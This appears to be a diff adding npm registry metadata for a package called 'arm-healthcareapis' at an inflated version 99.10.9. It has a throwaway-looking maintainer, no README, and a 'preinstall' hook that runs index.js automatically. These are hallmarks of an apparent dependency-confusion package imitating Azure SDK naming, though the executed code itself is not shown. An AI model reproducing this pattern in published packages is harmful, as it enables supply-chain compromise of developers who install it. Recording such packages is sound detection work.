@@ -1,0 +1,62 @@
+{
+    "_id": "arm-healthcareapis",
+    "name": "arm-healthcareapis",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "arm-healthcareapis",
+            "version": "99.10.9",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "arm-healthcareapis@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-ildXBVWtaIwGc4MqdUdA5X40UvNygGTooSVKja37KEcvYARyqKPv7ZbIxDx2litJT6lEdOsUW0hjElUePsItTQ==",
+                "shasum": "38ab62ba709af55edc5755a032d17b72c85e87c1",
+                "tarball": "https://registry.npmjs.org/arm-healthcareapis/-/arm-healthcareapis-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5070,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiNyjaACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmodoQ/+NZPdJP78HuQRA6xzNFKG2iLUV4oCXzlEX2AC45OCt14wpioy\r\nUPA5atsH7AatleC6VEAtk6UE6LIsFcPKlAyqsn0m5F7qKBdLIDACMPhkS7Q4\r\nK42xiW4PkVJvwTIZToXTXGbrO48xQb9/TCApDSyFSBPB911IJK+SFQ/qsLGA\r\nv3AjfaE9HP55MdYTk1rketseKiFJxWSkuooLQ1/j2hUAdcR60fHgxyQzBzNA\r\nzfCkEIlu0HmItRzHfBMBoGgbUQkTMgM3en0yhg5nHrBIAsQjgt4Csun1RM9U\r\nu9SHx2wQEZkdiAYu6+K1k/HojPgmO305XRcW/VBQTgYvOivGXKggqSuKB7ly\r\nu1lK5sxMSMhsyc9OwzNaWSbyUGpe73ra6YYOMYA0P1/H4zcAPblClZt+qWaB\r\nKI7YIi/9QKBVxmK7R41/LEQJQJ1qJT4Bh1ijInPd/3bX7B+i629KsLmokJHb\r\ngjM7qmq46miES9khOtsMjQg0xNwQI5i4wxjZ3I0ekRrgYaxL10C6Sewyc7gS\r\niaKTs+gNYzMgh6WogEyY87uuJuR70Qo6/VxRNghX3pHgQNkmlN7FgU0WDkDT\r\njFyp/9Qa6Tv1PcCqGdABWcw5K9Ql06+PqcLmkKIHbLWdj/X9B/WiZg+vezWa\r\nXnxpsxJLi7NyfC3lXDbCnDB9NSQlyY+vOYU=\r\n=0/qy\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "5thsdg8b",
+                "email": "5thsdg8b@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "5thsdg8b",
+                    "email": "5thsdg8b@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/arm-healthcareapis_99.10.9_1647782106031_0.7272715197424475"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-20T13:15:06.031Z",
+        "99.10.9": "2022-03-20T13:15:06.164Z",
+        "modified": "2022-03-20T13:15:06.265Z"
+    },
+    "maintainers": [
+        {
+            "name": "5thsdg8b",
+            "email": "5thsdg8b@rt11.ml"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
